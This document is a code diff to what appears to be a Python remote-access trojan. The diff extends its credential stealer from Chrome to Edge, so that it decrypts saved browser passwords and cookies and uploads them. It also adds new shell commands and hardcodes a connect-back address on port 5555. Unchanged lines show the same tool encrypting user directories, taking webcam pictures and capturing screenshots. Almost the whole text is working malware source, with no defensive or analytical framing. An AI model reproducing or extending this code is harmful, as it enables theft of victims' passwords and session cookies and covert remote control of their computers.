@@ -1,3 +1,4 @@
+# replace mss with pyautogui for screenshots
 import socket
 import json
 import subprocess
@@ -222,18 +223,24 @@ def get_chrome_datetime(chromedate):
     else:
         return ""
 
-def get_chrome_local_state():
-    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+def get_local_state(browser):
+    if browser == 'chrome':
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    elif browser == 'edge':
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
         return local_state
     
-def get_chrome_login_data():
-    return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+def get_login_data(browser):
+    if browser == 'chrome':
+        return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+    elif browser == 'edge':
+        return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "default", "Login Data")
 
-def get_chrome_encryption_key():
-    local_state = get_chrome_local_state()
+def get_encryption_key(browser):
+    local_state = get_local_state(browser)
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     key = key[5:]
     return CryptUnprotectData(key, None, None, None, 0)[1]
@@ -250,10 +257,11 @@ def decrypt_chrome_password(password, key):
         except:
             return ""
 
-def get_chrome_passwords():
-    key = get_chrome_encryption_key()
-    db_path = get_chrome_login_data()
-    filename = "ChromeData.db"
+def get_passwords(browser):
+    key = get_encryption_key(browser)
+    db_path = get_login_data(browser)
+    filename = "Data.db"
+
     shutil.copyfile(db_path, filename)
 
     db = sqlite3.connect(filename)
@@ -292,9 +300,13 @@ def get_chrome_passwords():
     byte_array = bytes(data, 'utf-8')
     return byte_array
 
-def get_chrome_cookies():
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+def get_cookies(browser):
+    if browser == 'chrome':
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+    elif browser == 'edge':
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies")
     filename = "Cookies.db"
     if not os.path.isfile(filename):
         shutil.copyfile(db_path, filename)
@@ -305,7 +317,8 @@ def get_chrome_cookies():
     cursor.execute("""
     SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
     FROM cookies""")
-    key = get_chrome_encryption_key()
+
+    key = get_encryption_key(browser)
     data = '' 
     for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
         if not value:
@@ -336,13 +349,13 @@ def get_chrome_cookies():
     byte_array = bytes(data, 'utf-8')
     return byte_array
 
-def get_cookies_and_upload():
-    byte_array = get_chrome_cookies()
+def get_cookies_and_upload(browser):
+    byte_array = get_cookies(browser)
     byte_arr_io = io.BytesIO(byte_array)
     upload_byte_arr(byte_arr_io)
 
-def get_passwords_and_upload():
-    byte_array = get_chrome_passwords()
+def get_passwords_and_upload(browser):
+    byte_array = get_passwords(browser)
     byte_arr_io = io.BytesIO(byte_array)
     upload_byte_arr(byte_arr_io)
 
@@ -373,9 +386,9 @@ def shell():
                 encrypt_user_dir()
             case 'webcam':
                 capture_webcam_picture(args)
-            case 'upload':
+            case 'put':
                 download_file(args)
-            case 'download':
+            case 'get':
                 upload_file(args)
             case 'screenshot':
                 img_byte_arr = screenshot()
@@ -392,14 +405,24 @@ def shell():
                     reliable_send('Cannot Perform System Info Collection!')
             case 'chrome_pass':
                 try:
-                    get_passwords_and_upload()
+                    get_passwords_and_upload('chrome')
                 except:
                     reliable_send('Cannot Perform Chrome Password Collection!')
+            case 'edge_pass':
+                try:
+                    get_passwords_and_upload('edge')
+                except:
+                    reliable_send('Cannot Perform Edge Password Collection!')
             case 'chrome_cookies':
                 try:
-                    get_cookies_and_upload()
+                    get_cookies_and_upload('chrome')
                 except:
                     reliable_send('Cannot Perform Chrome Cookie Collection!')
+            case 'edge_cookies':
+                try:
+                    get_cookies_and_upload('edge')
+                except:
+                    reliable_send('Cannot Perform Edge Cookie Collection!')
             case 'check':
                 try:
                     is_admin()
@@ -422,7 +445,7 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            s.connect(('SERVER IP', 5555))
+            s.connect(('192.168.0.183', 5555))
             shell()
             s.close()
             break
